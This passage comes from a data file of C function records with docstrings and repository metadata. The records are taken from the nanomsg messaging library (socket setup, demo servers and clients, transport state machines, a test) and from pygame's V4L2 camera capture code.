0)) {\n            if (!(socktype->flags & NN_SOCKTYPE_FLAG_NOSEND))\n                nn_efd_term (&self->sndfd);\n            return rc;\n        }\n    }\n    nn_sem_init (&self->termsem);\n    nn_sem_init (&self->relesem);\n    if (nn_slow (rc < 0)) {\n        if (!(socktype->flags & NN_SOCKTYPE_FLAG_NORECV))\n            nn_efd_term (&self->rcvfd);\n        if (!(socktype->flags & NN_SOCKTYPE_FLAG_NOSEND))\n            nn_efd_term (&self->sndfd);\n        return rc;\n    }\n\n    self->holds = 1;   /*  Callers hold. */\n    self->flags = 0;\n    nn_list_init (&self->eps);\n    nn_list_init (&self->sdeps);\n    self->eid = 1;\n\n    /*  Default values for NN_SOL_SOCKET options. */\n    self->sndbuf = 128 * 1024;\n    self->rcvbuf = 128 * 1024;\n    self->rcvmaxsize = 1024 * 1024;\n    self->sndtimeo = -1;\n    self->rcvtimeo = -1;\n    self->reconnect_ivl = 100;\n    self->reconnect_ivl_max = 0;\n    self->maxttl = 8;\n    self->ep_template.sndprio = 8;\n    self->ep_template.rcvprio = 8;\n    self->ep_template.ipv4only = 1;\n\n    /* Clear statistic entries */\n    memset(&self->statistics, 0, sizeof (self->statistics));\n\n    /*  Should be pretty much enough space for just the number  */\n    sprintf(self->socket_name, \"%d\", fd);\n\n    /* Security attribute */\n    self->sec_attr = NULL;\n    self->sec_attr_size = 0;\n    self->inbuffersz = 4096;\n    self->outbuffersz = 4096;\n\n    /*  The transport-specific options are not initialised immediately,\n        rather, they are allocated later on when needed. */\n    for (i = 0; i != NN_MAX_TRANSPORT; ++i)\n        self->optsets [i] = NULL;\n\n    /*  Create the specific socket type itself. */\n    rc = socktype->create ((void*) self, &self->sockbase);\n    errnum_assert (rc == 0, -rc);\n    self->socktype = socktype;\n\n    /*  Launch the state machine. */\n    nn_ctx_enter (&self->ctx);\n    nn_fsm_start (&self->fsm);\n    nn_ctx_leave (&self->ctx);\n\n    return 0;\n}", "path": "nanomsg/src/core/sock.c", "commit_date": "2018-06-01 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  The server runs forever. */\n", "func_signal": "int server(const char *url)", "code": "{\n    int fd; \n\n    /*  Create the socket. */\n    fd = nn_socket (AF_SP, NN_PUB);\n    if (fd < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        return (-1);\n    }\n\n    /*  Bind to the URL.  This will bind to the address and listen\n        synchronously; new clients will be accepted asynchronously\n        without further action from the calling program. */\n\n    if (nn_bind (fd, url) < 0) {\n        fprintf (stderr, \"nn_bind: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    /*  Now we can just publish results.  Note that there is no explicit\n        accept required.  We just start writing the information. */\n\n    for (;;) {\n        uint8_t msg[2 * sizeof (uint32_t)];\n        uint32_t secs, subs;\n        int rc;\n\n        secs = (uint32_t) time (NULL);\n        subs = (uint32_t) nn_get_statistic (fd, NN_STAT_CURRENT_CONNECTIONS);\n\n        secs = htonl (secs);\n        subs = htonl (subs);\n\n        memcpy (msg, &secs, sizeof (secs));\n        memcpy (msg + sizeof (secs), &subs, sizeof (subs));\n\n        rc = nn_send (fd, msg, sizeof (msg), 0);\n        if (rc < 0) {\n            /*  There are several legitimate reasons this can fail.\n                We note them for debugging purposes, but then ignore\n                otherwise. */\n            fprintf (stderr, \"nn_send: %s (ignoring)\\n\",\n                nn_strerror (nn_errno ()));\n        }\n        sleep(10);\n    }\n\n    /* NOTREACHED */\n    nn_close (fd);\n    return (-1);\n}", "path": "nanomsg/demo/pubsub_demo.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  This test checks whether the library prevents interconnecting sockets\n    between different non-compatible protocols. */\n", "func_signal": "int main (int argc, const char *argv[])", "code": "{\n    int rc;\n    int pair;\n    int pull;\n    int timeo;\n    char socket_address_tcp[128];\n\n    test_addr_from(socket_address_tcp, \"tcp\", \"127.0.0.1\",\n            get_test_port(argc, argv));\n\n    /*  Inproc: Bind first, connect second. */\n    pair = test_socket (AF_SP, NN_PAIR);\n    test_bind (pair, SOCKET_ADDRESS_INPROC);\n    pull = test_socket (AF_SP, NN_PULL);\n    test_connect (pull, SOCKET_ADDRESS_INPROC);\n    timeo = 100;\n    test_setsockopt (pair, NN_SOL_SOCKET, NN_SNDTIMEO,\n        &timeo, sizeof (timeo));\n    rc = nn_send (pair, \"ABC\", 3, 0);\n    errno_assert (rc < 0 && nn_errno () == ETIMEDOUT);\n    test_close (pull);\n    test_close (pair);\n\n    /*  Inproc: Connect first, bind second. */\n    pull = test_socket (AF_SP, NN_PULL);\n    test_connect (pull, SOCKET_ADDRESS_INPROC);\n    pair = test_socket (AF_SP, NN_PAIR);\n    test_bind (pair, SOCKET_ADDRESS_INPROC);\n    timeo = 100;\n    test_setsockopt (pair, NN_SOL_SOCKET, NN_SNDTIMEO,\n        &timeo, sizeof (timeo));\n    rc = nn_send (pair, \"ABC\", 3, 0);\n    errno_assert (rc < 0 && nn_errno () == ETIMEDOUT);\n    test_close (pull);\n    test_close (pair);\n\n#if !defined NN_HAVE_WINDOWS && !defined NN_HAVE_WSL\n\n    /*  IPC */\n    pair = test_socket (AF_SP, NN_PAIR);\n    test_bind (pair, SOCKET_ADDRESS_IPC);\n    pull = test_socket (AF_SP, NN_PULL);\n    test_connect (pull, SOCKET_ADDRESS_IPC);\n    timeo = 100;\n    test_setsockopt (pair, NN_SOL_SOCKET, NN_SNDTIMEO,\n        &timeo, sizeof (timeo));\n    rc = nn_send (pair, \"ABC\", 3, 0);\n    errno_assert (rc < 0 && nn_errno () == ETIMEDOUT);\n    test_close (pull);\n    test_close (pair);\n\n#endif\n\n    /*  TCP */\n    pair = test_socket (AF_SP, NN_PAIR);\n    test_bind (pair, socket_address_tcp);\n    pull = test_socket (AF_SP, NN_PULL);\n    test_connect (pull, socket_address_tcp);\n    timeo = 100;\n    test_setsockopt (pair, NN_SOL_SOCKET, NN_SNDTIMEO,\n        &timeo, sizeof (timeo));\n    rc = nn_send (pair, \"ABC\", 3, 0);\n    errno_assert (rc < 0 && nn_errno () == ETIMEDOUT);\n    test_close (pull);\n    test_close (pair);\n\n    return 0;\n}", "path": "nanomsg/tests/separation.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  The server runs forever. */\n", "func_signal": "int server(const char *url)", "code": "{\n    int fd; \n    struct work *worklist = NULL;\n    int npending = 0;\n\n    /*  Create the socket. */\n    fd = nn_socket(AF_SP_RAW, NN_REP);\n    if (fd < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        return (-1);\n    }\n\n    /*  Bind to the URL.  This will bind to the address and listen\n        synchronously; new clients will be accepted asynchronously\n        without further action from the calling program. */\n\n    if (nn_bind (fd, url) < 0) {\n        fprintf (stderr, \"nn_bind: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    /*  Main processing loop. */\n\n    for (;;) {\n        uint32_t timer;\n        int rc;\n        int timeout;\n        uint64_t now;\n        struct work *work, **srch;\n        uint8_t *body;\n        void *control;\n        struct nn_iovec iov;\n        struct nn_msghdr hdr;\n        struct nn_pollfd pfd[1];\n\n        /*  Figure out if any work requests are finished, and can be\n            responded to. */\n\n        timeout = -1;\n        while ((work = worklist) != NULL) {\n\n            now = milliseconds ();\n            if (work->expire > now) {\n                timeout = (work->expire - now);\n                break;\n            }\n            worklist = work->next;\n            npending--;\n            rc = nn_sendmsg (fd, &work->request, NN_DONTWAIT);\n            if (rc < 0) {\n                fprintf (stderr, \"nn_sendmsg: %s\\n\",\n                    nn_strerror (nn_errno ()));\n                nn_freemsg (work->request.msg_control);\n            }\n            free (work);\n        }\n\n        /*  This check ensures that we don't allow more than a set limit\n            of concurrent jobs to be queued.  This protects us from resource\n            exhaustion by malicious or defective clients. */\n\n        if (npending >= MAXJOBS) {\n            nn_poll (pfd, 0, timeout);\n            continue;\n        }\n\n        pfd[0].fd = fd;\n        pfd[0].events = NN_POLLIN;\n        pfd[0].revents = 0;\n        nn_poll (pfd, 1, timeout);\n\n        if ((pfd[0].revents & NN_POLLIN) == 0) {\n            continue;\n        }\n\n        /*  So there should be a message waiting for us to receive.\n            We handle it by parsing it, creating a work request for it,\n            and adding the work request to the worklist. */\n\n        memset (&hdr, 0, sizeof (hdr));\n        control = NULL;\n        iov.iov_base = &body;\n        iov.iov_len = NN_MSG;\n        hdr.msg_iov = &iov;\n        hdr.msg_iovlen = 1;\n        hdr.msg_control = &control;\n        hdr.msg_controllen = NN_MSG;\n\n        rc = nn_recvmsg (fd, &hdr, 0);\n        if (rc < 0) {\n            /*  Any error here is unexpected. */\n            fprintf (stderr, \"nn_recv: %s\\n\", nn_strerror (nn_errno ()));\n            break;\n        }\n        if (rc != sizeof (uint32_t)) {\n            fprintf (stderr, \"nn_recv: wanted %d, but got %d\\n\",\n                (int) sizeof (uint32_t), rc);\n            nn_freemsg (body);\n            nn_freemsg (control);\n            continue;\n        }\n\n        memcpy (&timer, body, sizeof (timer));\n        nn_freemsg (body);\n\n        work = malloc (sizeof (*work));\n        if (work == NULL) {\n            fprintf (stderr, \"malloc: %s\\n\", strerror (errno));\n            /*  Fatal error -- other programs can try to handle it better. */\n            break;\n        }\n        memset (work, 0, sizeof (*work));\n        work->expire = milliseconds () + ntohl (timer);\n        work->control = control;\n        work->request.msg_iovlen = 0;  /*  No payload data to send. */\n        work->request.msg_iov = NULL;\n        work->request.msg_control = &work->control;\n        work->request.msg_controllen = NN_MSG;\n\n        /*  Insert the work request into the list in order. */\n        srch = &worklist;\n        for (;;) {\n            if ((*srch == NULL) || ((*srch)->expire > work->expire)) {\n                work->next = *srch;\n                *srch = work;\n                npending++;\n                break;\n            }\n            srch = &((*srch)->next);\n        }\n    }\n\n    /*  This may wind up orphaning requests in the queue.   We are going\n        to exit with an error anyway, so don't worry about it. */\n\n    nn_close (fd);\n    return (-1);\n}", "path": "nanomsg/demo/async_demo.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  The client runs just once, and then returns. */\n", "func_signal": "int client (const char *url, const char *username)", "code": "{\n    int fd;\n    int rc;\n    char *greeting;\n    char *msg;\n\n    fd = nn_socket (AF_SP, NN_REQ);\n    if (fd < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        return (-1);\n    }\n\n    if (nn_connect (fd, url) < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);        \n    }\n\n    usleep(1000);\n\n    if (nn_send (fd, username, strlen (username), 0) < 0) {\n        fprintf (stderr, \"nn_send: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    /*  Here we ask the library to allocate response buffer for us (NN_MSG). */\n    rc = nn_recv (fd, &msg, NN_MSG, 0);\n    if (rc < 0) {\n        fprintf (stderr, \"nn_recv: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    nn_close (fd);\n\n    /*  Response is not ASCIIZ terminated. */\n    greeting = calloc (rc + 1, 1);\n    if (greeting == NULL) {\n        fprintf (stderr, \"calloc: %s\\n\", strerror (errno));\n        return (-1);\n    }\n    memcpy(greeting, msg, rc);\n\n    nn_freemsg (msg);\n    printf (\"%s\\n\", greeting); \n    free (greeting);\n    return (0);\n}", "path": "nanomsg/demo/device_demo.c", "commit_date": "2017-10-11 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/******************************************************************************/\n/*  State machine actions.                                                    */\n/******************************************************************************/\n", "func_signal": "static void nn_ctcp_start_resolving (struct nn_ctcp *self)", "code": "{\n    const char *addr;\n    const char *begin;\n    const char *end;\n    int ipv4only;\n    size_t ipv4onlylen;\n\n    /*  Extract the hostname part from address string. */\n    addr = nn_ep_getaddr (self->ep);\n    begin = strchr (addr, ';');\n    if (!begin)\n        begin = addr;\n    else\n        ++begin;\n    end = strrchr (addr, ':');\n    nn_assert (end);\n\n    /*  Check whether IPv6 is to be used. */\n    ipv4onlylen = sizeof (ipv4only);\n    nn_ep_getopt (self->ep, NN_SOL_SOCKET, NN_IPV4ONLY,\n        &ipv4only, &ipv4onlylen);\n    nn_assert (ipv4onlylen == sizeof (ipv4only));\n\n    /*  TODO: Get the actual value of IPV4ONLY option. */\n    nn_dns_start (&self->dns, begin, end - begin, ipv4only, &self->dns_result);\n\n    self->state = NN_CTCP_STATE_RESOLVING;\n}", "path": "nanomsg/src/transports/tcp/ctcp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  Set up an ep for use by a transport.  Note that the core will already have\n    done most of the initialization steps.  The tran is passed as the argument\n    to the ops. */\n", "func_signal": "void nn_ep_tran_setup (struct nn_ep *ep, const struct nn_ep_ops *ops,\n    void *tran)", "code": "{\n    ep->ops = *ops;\n    ep->tran = tran;\n}", "path": "nanomsg/src/core/ep.c", "commit_date": "2016-11-28 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/******************************************************************************/\n/*  State machine actions.                                                    */\n/******************************************************************************/\n", "func_signal": "static void nn_cipc_start_connecting (struct nn_cipc *self)", "code": "{\n    int rc;\n    struct sockaddr_storage ss;\n    struct sockaddr_un *un;\n    const char *addr;\n    int val;\n    size_t sz;\n\n    /*  Try to start the underlying socket. */\n    rc = nn_usock_start (&self->usock, AF_UNIX, SOCK_STREAM, 0);\n    if (nn_slow (rc < 0)) {\n        nn_backoff_start (&self->retry);\n        self->state = NN_CIPC_STATE_WAITING;\n        return;\n    }\n\n    /*  Set the relevant socket options. */\n    sz = sizeof (val);\n    nn_ep_getopt (self->ep, NN_SOL_SOCKET, NN_SNDBUF, &val, &sz);\n    nn_assert (sz == sizeof (val));\n    nn_usock_setsockopt (&self->usock, SOL_SOCKET, SO_SNDBUF,\n        &val, sizeof (val));\n    sz = sizeof (val);\n    nn_ep_getopt (self->ep, NN_SOL_SOCKET, NN_RCVBUF, &val, &sz);\n    nn_assert (sz == sizeof (val));\n    nn_usock_setsockopt (&self->usock, SOL_SOCKET, SO_RCVBUF,\n        &val, sizeof (val));\n\n    /*  Create the IPC address from the address string. */\n    addr = nn_ep_getaddr (self->ep);\n    memset (&ss, 0, sizeof (ss));\n    un = (struct sockaddr_un*) &ss;\n    nn_assert (strlen (addr) < sizeof (un->sun_path));\n    ss.ss_family = AF_UNIX;\n    strncpy (un->sun_path, addr, sizeof (un->sun_path));\n\n#if defined NN_HAVE_WINDOWS\n    /* Get/Set security attribute pointer*/\n    nn_ep_getopt (self->ep, NN_IPC, NN_IPC_SEC_ATTR, &self->usock.sec_attr, &sz);\n\n    nn_ep_getopt (self->ep, NN_IPC, NN_IPC_OUTBUFSZ, &self->usock.outbuffersz, &sz);\n    nn_ep_getopt (self->ep, NN_IPC, NN_IPC_INBUFSZ, &self->usock.inbuffersz, &sz);\n#endif\n\n    /*  Start connecting. */\n    nn_usock_connect (&self->usock, (struct sockaddr*) &ss,\n        sizeof (struct sockaddr_un));\n    self->state  = NN_CIPC_STATE_CONNECTING;\n\n    nn_ep_stat_increment (self->ep, NN_STAT_INPROGRESS_CONNECTIONS, 1);\n}", "path": "nanomsg/src/transports/ipc/cipc.c", "commit_date": "2016-11-28 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  The server runs forever. */\n", "func_signal": "int server(const char *url)", "code": "{\n    int fd; \n\n    /*  Create the socket. */\n    fd = nn_socket (AF_SP, NN_REP);\n    if (fd < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        return (-1);\n    }\n\n    /*  Connect to the URL.  This will connect to the address and listen\n        synchronously; new clients will be accepted asynchronously\n        without further action from the calling program. */\n\n    if (nn_connect (fd, url) < 0) {\n        fprintf (stderr, \"nn_connect: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    /*  Now we can just process results.  Note that there is no explicit\n        accept required.  We just receive a request, and reply to it.\n        Its important to note that we must not issue two receives in a\n        row without replying first, or the following receive(s) will\n        cancel any unreplied requests. */\n\n    for (;;) {\n        char username[128];\n        char greeting[128];\n        time_t secs;\n        struct tm *now;\n        char *daytime;\n        int rc;\n        char *fmt;\n\n        rc = nn_recv (fd, username, sizeof (username), 0);\n        if (rc < 0) {\n            /*  Any error here is unexpected. */\n            fprintf (stderr, \"nn_recv: %s\\n\", nn_strerror (nn_errno ()));\n            break;\n        }\n\n        secs = time (NULL);\n        now = localtime (&secs);\n        if (now->tm_hour < 12) {\n            daytime = \"morning\";\n\n        } else if (now->tm_hour < 17) {\n            daytime = \"afternoon\";\n\n        } else if (now->tm_hour < 20) {\n            daytime = \"evening\";\n\n        } else {\n            daytime = \"night\";\n        }\n\n        /*  Ensure ASCIIZ terminated string. */\n        if (rc < sizeof (username)) {\n            username[rc] = '\\0';\n        } else {\n            username[sizeof (username) - 1] = '\\0';\n        }\n\n        fmt = \"Good %s, %s (from %d).\";\n\n        /*  Technically this might be overly pessimistic about size. */\n        if ((strlen (username) + strlen (daytime) + strlen (fmt)) >=\n            sizeof (greeting)) {\n\n            fmt = \"I'm sorry, your name is too long.  But good %s anyway.\";\n        }\n\n        /*  snprintf would be safer, but the above check protects us. */\n        sprintf (greeting, fmt, daytime, username, (int)getpid());\n\n        rc = nn_send (fd, greeting, strlen (greeting), 0);\n        if (rc < 0) {\n            /*  There are several legitimate reasons this can fail.\n                We note them for debugging purposes, but then ignore\n                otherwise.  If the socket is closed or failing, we will\n                notice in recv above, and exit then. */\n            fprintf (stderr, \"nn_send: %s (ignoring)\\n\",\n                nn_strerror (nn_errno ()));\n        }\n    }\n\n    nn_close (fd);\n    return (-1);\n}", "path": "nanomsg/demo/device_demo.c", "commit_date": "2017-10-11 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  This craziness is required because Windows doesn't have the notion of\n    static initializers for CriticalSections.  */\n", "func_signal": "BOOL CALLBACK nn_do_once_cb (PINIT_ONCE InitOnce,\n    PVOID Parameter, PVOID *Context)", "code": "{\n    void (*func)(void) = Parameter;\n    func();\n    return (TRUE);\n}", "path": "nanomsg/src/utils/once.c", "commit_date": "2016-05-13 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/******************************************************************************/\n/*  State machine actions.                                                    */\n/******************************************************************************/\n", "func_signal": "static void nn_cws_start_resolving (struct nn_cws *self)", "code": "{\n    int ipv4only;\n    size_t ipv4onlylen;\n    char *host;\n\n    /*  Check whether IPv6 is to be used. */\n    ipv4onlylen = sizeof (ipv4only);\n    nn_ep_getopt (self->ep, NN_SOL_SOCKET, NN_IPV4ONLY,\n        &ipv4only, &ipv4onlylen);\n    nn_assert (ipv4onlylen == sizeof (ipv4only));\n\n    host = nn_chunkref_data (&self->remote_host);\n    nn_assert (strlen (host) > 0);\n\n    nn_dns_start (&self->dns, host, self->remote_hostname_len, ipv4only,\n        &self->dns_result);\n\n    self->state = NN_CWS_STATE_RESOLVING;\n}", "path": "nanomsg/src/transports/ws/cws.c", "commit_date": "2017-10-11 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  Simulate semaphores with condition variables. */\n", "func_signal": "void nn_sem_init (struct nn_sem *self)", "code": "{\n    int rc;\n\n    rc = pthread_mutex_init (&self->mutex, NULL);\n    errnum_assert (rc == 0, rc);\n    rc = pthread_cond_init (&self->cond, NULL);\n    errnum_assert (rc == 0, rc);\n    self->signaled = 0;\n}", "path": "nanomsg/src/utils/sem.c", "commit_date": "2018-06-08 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  Get the socket structure for a socket id.  This must be called under\n    the global lock (self.lock.)  The socket itself will not be freed\n    while the hold is active. */\n", "func_signal": "int nn_global_hold_socket_locked(struct nn_sock **sockp, int s)", "code": "{\n    struct nn_sock *sock;\n\n    if (nn_slow (s < 0 || s >= NN_MAX_SOCKETS || self.socks == NULL))\n        return -EBADF;\n\n    sock = self.socks[s];\n    if (nn_slow (sock == NULL)) {\n        return -EBADF;\n    }\n\n    if (nn_slow (nn_sock_hold (sock) != 0)) {\n        return -EBADF;\n    }\n    *sockp = sock;\n    return 0;\n}", "path": "nanomsg/src/core/global.c", "commit_date": "2018-05-23 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  The client runs in a loop, displaying the content. */\n", "func_signal": "int client (const char *url)", "code": "{\n    int fd;\n    int rc;\n\n    fd = nn_socket (AF_SP, NN_SUB);\n    if (fd < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        return (-1);\n    }\n\n    if (nn_connect (fd, url) < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);        \n    }\n\n    /*  We want all messages, so just subscribe to the empty value. */\n    if (nn_setsockopt (fd, NN_SUB, NN_SUB_SUBSCRIBE, \"\", 0) < 0) {\n        fprintf (stderr, \"nn_setsockopt: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);        \n    }\n\n    for (;;) {\n        uint8_t msg[2 * sizeof (uint32_t)];\n        char hhmmss[9];  /* HH:MM:SS\\0 */\n        uint32_t subs, secs;\n        time_t t;\n\n        rc = nn_recv (fd, msg, sizeof (msg), 0);\n        if (rc < 0) {\n            fprintf (stderr, \"nn_recv: %s\\n\", nn_strerror (nn_errno ()));\n            break;\n        }\n        if (rc != sizeof (msg)) {\n            fprintf (stderr, \"nn_recv: got %d bytes, wanted %d\\n\",\n                rc, (int)sizeof (msg));\n             break;\n        }\n        memcpy (&secs, msg, sizeof (secs));\n        memcpy (&subs, msg + sizeof (secs), sizeof (subs));\n\n        t = (time_t) ntohl(secs);\n        strftime (hhmmss, sizeof (hhmmss), \"%T\", localtime (&t));\n\n        printf (\"%s <pid %u> There are %u clients connected.\\n\", hhmmss,\n            (unsigned) getpid(), (unsigned) ntohl(subs));\n    }\n\n    nn_close (fd);\n    return (-1);\n}", "path": "nanomsg/demo/pubsub_demo.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  The client runs just once, and then returns. */\n", "func_signal": "int client (const char *url, const char *msecstr)", "code": "{\n    int fd;\n    int rc;\n    char *greeting;\n    uint8_t msg[sizeof (uint32_t)];\n    uint64_t start;\n    uint64_t end;\n    unsigned msec;\n\n    msec = atoi(msecstr);\n\n    fd = nn_socket (AF_SP, NN_REQ);\n    if (fd < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        return (-1);\n    }\n\n    if (nn_connect (fd, url) < 0) {\n        fprintf (stderr, \"nn_socket: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);        \n    }\n\n    msec = htonl(msec);\n    memcpy (msg, &msec, sizeof (msec));\n\n    start = milliseconds ();\n\n    if (nn_send (fd, msg, sizeof (msg), 0) < 0) {\n        fprintf (stderr, \"nn_send: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    rc = nn_recv (fd, &msg, sizeof (msg), 0);\n    if (rc < 0) {\n        fprintf (stderr, \"nn_recv: %s\\n\", nn_strerror (nn_errno ()));\n        nn_close (fd);\n        return (-1);\n    }\n\n    nn_close (fd);\n\n    end = milliseconds ();\n\n    printf (\"Request took %u milliseconds.\\n\", (uint32_t)(end - start));\n    return (0);\n}", "path": "nanomsg/demo/async_demo.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  Stop the socket.  This will prevent new calls from aquiring a\n    hold on the socket, cause endpoints to shut down, and wake any\n    threads waiting to recv or send data. */\n", "func_signal": "void nn_sock_stop (struct nn_sock *self)", "code": "{\n    nn_ctx_enter (&self->ctx);\n    nn_fsm_stop (&self->fsm);\n    nn_ctx_leave (&self->ctx);\n}", "path": "nanomsg/src/core/sock.c", "commit_date": "2018-06-01 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/******************************************************************************/\n/*  State machine actions.                                                    */\n/******************************************************************************/\n", "func_signal": "static void nn_bws_start_accepting (struct nn_bws *self)", "code": "{\n    nn_assert (self->aws == NULL);\n\n    /*  Allocate new aws state machine. */\n    self->aws = nn_alloc (sizeof (struct nn_aws), \"aws\");\n    alloc_assert (self->aws);\n    nn_aws_init (self->aws, NN_BWS_SRC_AWS, self->ep, &self->fsm);\n\n    /*  Start waiting for a new incoming connection. */\n    nn_aws_start (self->aws, &self->usock);\n}", "path": "nanomsg/src/transports/ws/bws.c", "commit_date": "2016-11-28 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/* query each buffer to see if it contains a frame ready to take */\n", "func_signal": "int\nv4l2_query_buffer(pgCameraObject *self)", "code": "{\n    int i;\n\n    for (i = 0; i < self->n_buffers; ++i) {\n        struct v4l2_buffer buf;\n\n        CLEAR(buf);\n\n        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;\n        buf.memory = V4L2_MEMORY_MMAP;\n        buf.index = i;\n\n        if (-1 == v4l2_xioctl(self->fd, VIDIOC_QUERYBUF, &buf)) {\n            PyErr_Format(PyExc_MemoryError,\n                         \"ioctl(VIDIOC_QUERYBUF) failure : %d, %s\", errno,\n                         strerror(errno));\n            return 0;\n        }\n\n        /*  is there a buffer on outgoing queue ready for us to take? */\n        if (buf.flags & V4L2_BUF_FLAG_DONE)\n            return 1;\n    }\n\n    /* no buffer ready to take */\n    return 0;\n}", "path": "pygame/src_c/camera_v4l2.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "pygame/pygame", "stars": 6805, "license": "None", "language": "c", "size": 33485}
{"docstring": "/* sends the image to the conversion function based on input format and\n   desired output format.  Note that some of the less common conversions are\n   currently two step processes. */\n/* TODO: Write single step conversions where they may actually be useful */\n", "func_signal": "int\nv4l2_process_image(pgCameraObject *self, const void *image,\n                   unsigned int buffer_size, SDL_Surface *surf)", "code": "{\n    if (!surf)\n        return 0;\n\n    SDL_LockSurface(surf);\n\n    switch (self->pixelformat) {\n        case V4L2_PIX_FMT_RGB24:\n            if (buffer_size >= self->size * 3) {\n                switch (self->color_out) {\n                    case RGB_OUT:\n                        rgb24_to_rgb(image, surf->pixels, self->size,\n                                     surf->format);\n                        break;\n                    case HSV_OUT:\n                        rgb_to_hsv(image, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_RGB24, surf->format);\n                        break;\n                    case YUV_OUT:\n                        rgb_to_yuv(image, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_RGB24, surf->format);\n                        break;\n                }\n            }\n            else {\n                SDL_UnlockSurface(surf);\n                return 0;\n            }\n            break;\n        case V4L2_PIX_FMT_RGB444:\n            if (buffer_size >= self->size * 2) {\n                switch (self->color_out) {\n                    case RGB_OUT:\n                        rgb444_to_rgb(image, surf->pixels, self->size,\n                                      surf->format);\n                        break;\n                    case HSV_OUT:\n                        rgb_to_hsv(image, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_RGB444, surf->format);\n                        break;\n                    case YUV_OUT:\n                        rgb_to_yuv(image, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_RGB444, surf->format);\n                        break;\n                }\n            }\n            else {\n                SDL_UnlockSurface(surf);\n                return 0;\n            }\n            break;\n        case V4L2_PIX_FMT_YUYV:\n            if (buffer_size >= self->size * 2) {\n                switch (self->color_out) {\n                    case YUV_OUT:\n                        yuyv_to_yuv(image, surf->pixels, self->size,\n                                    surf->format);\n                        break;\n                    case RGB_OUT:\n                        yuyv_to_rgb(image, surf->pixels, self->size,\n                                    surf->format);\n                        break;\n                    case HSV_OUT:\n                        yuyv_to_rgb(image, surf->pixels, self->size,\n                                    surf->format);\n                        rgb_to_hsv(surf->pixels, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_YUYV, surf->format);\n                        break;\n                }\n            }\n            else {\n                SDL_UnlockSurface(surf);\n                return 0;\n            }\n            break;\n        case V4L2_PIX_FMT_UYVY:\n            if (buffer_size >= self->size * 2) {\n                switch (self->color_out) {\n                    case YUV_OUT:\n                        uyvy_to_yuv(image, surf->pixels, self->size,\n                                    surf->format);\n                        break;\n                    case RGB_OUT:\n                        uyvy_to_rgb(image, surf->pixels, self->size,\n                                    surf->format);\n                        break;\n                    case HSV_OUT:\n                        uyvy_to_rgb(image, surf->pixels, self->size,\n                                    surf->format);\n                        rgb_to_hsv(surf->pixels, surf->pixels, self->size,\n                                   V4L2_PIX_FMT_YUYV, surf->format);\n                        break;\n                }\n            }\n            else {\n                SDL_UnlockSurface(surf);\n                return 0;\n            }\n         